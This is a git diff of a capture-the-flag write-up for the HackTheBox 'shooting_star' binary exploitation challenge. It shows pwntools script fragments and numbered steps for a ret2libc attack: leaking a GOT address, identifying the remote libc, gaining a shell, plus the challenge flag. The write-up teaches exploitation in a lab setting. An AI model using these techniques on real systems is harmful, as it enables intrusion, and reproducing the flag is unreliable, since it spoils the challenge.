@@ -250,9 +250,7 @@ import os
 os.system('clear')
 
 def start(argv=[], *a, **kw):
-    if args.GDB:  
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  
+    if args.REMOTE:  
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  
         return process([exe] + argv, *a, **kw)
@@ -269,12 +267,7 @@ def find_ip(payload):
     ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
     info('located EIP/RIP offset at {a}'.format(a=ip_offset))
     return ip_offset
-
-gdbscript = '''
-init-pwndbg
-break main
-'''.format(**locals())
-
+    
 exe = './shooting_star'
 elf = context.binary = ELF(exe, checksec=False)
 context.log_level = 'debug'
@@ -330,3 +323,68 @@ sh.recvuntil('May your wish come true!\n')
 sh.interactive()
 
 ```
+
+> OUTPUT - LOCAL
+
+![image](https://user-images.githubusercontent.com/70703371/210128202-a7f01027-d0d8-4d86-9356-30aa88e438d6.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210128220-78210a31-b21d-4bb2-894f-f5edfcfe5612.png)
+
+
+30. Got the shell! Now test it remotely.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210128229-c8c5e255-d3e6-49fd-aad2-f2bc140c30fe.png)
+
+
+31. Got segmentation fault here. Confused here.
+32. So i check the forum and got a hint that we need to check what versions of LIBC is running on the remote server.
+33. We can search that using [this](https://libc.blukat.me/) webapp.
+34. Using our leaked got address, paste it on the we app and click find.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210128342-41330bc8-617f-4950-b674-39aaca752805.png)
+
+
+35. Click on this one.
+
+![image](https://user-images.githubusercontent.com/70703371/210128346-10573c13-f72c-4385-8f52-0ccc8909c0aa.png)
+
+
+36. Copy the **write**, **system**, and **bin/sh** offset.
+
+![image](https://user-images.githubusercontent.com/70703371/210128363-81da8c21-b8df-4858-b41b-b0ae2bdd50d8.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210128472-15455f1b-8879-40b0-9020-769e8b7661ea.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210128385-779dc974-3c72-402f-8b89-360f896b1651.png)
+
+
+37. Great! Now let's run the script again remotely.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210128523-246e2d3c-9827-4eea-9f87-fed3b92dc0d2.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210128527-fc345c8e-999a-43c8-a62a-b0820e540a69.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210128531-9c7907a5-d9f2-44bd-9e77-6707a806f1ef.png)
+
+
+38. Got the flag!
+
+## FLAG
+
+```
+HTB{1_w1sh_pwn_w4s_th1s_e4sy}
+```
+
+
+
